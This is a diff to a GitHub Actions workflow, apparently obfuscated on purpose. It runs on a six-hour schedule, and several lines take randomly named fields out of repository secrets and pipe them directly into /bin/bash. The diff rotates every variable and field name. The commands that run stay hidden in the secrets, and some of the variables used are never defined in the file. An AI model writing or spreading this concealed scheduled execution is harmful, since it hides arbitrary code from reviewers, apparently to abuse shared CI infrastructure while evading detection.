@@ -1,9 +1,8 @@
 name: absorbedaid
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '16 5/6 * * *'
 
 jobs:
   build:
@@ -13,12 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: absorbedaid
         env:
-          krr9: ${{ secrets.krr9 }}
+          jbl1: ${{ secrets.jbl1 }}
         run: |
-          echo $krr9 | jq -r .rlbs89 | /bin/bash
-          echo $fpa15 | jq -r .z05 | /bin/bash
-          echo $vv20020 | jq -r .eg08937 | /bin/bash
-          echo $qx48 | jq -r .vzlxi072 | /bin/bash
-          echo $t37 | jq -r .s69262 | /bin/bash
-          echo $a8 | jq -r .rsq7 | /bin/bash
+          echo $jbl1 | jq -r .is184 | /bin/bash
+          echo $tkw73 | jq -r .i050 | /bin/bash
+          echo $nd347 | jq -r .p3955 | /bin/bash
+          echo $q622 | jq -r .bkgib77 | /bin/bash
+          echo $nhws586 | jq -r .snw3324 | /bin/bash
 
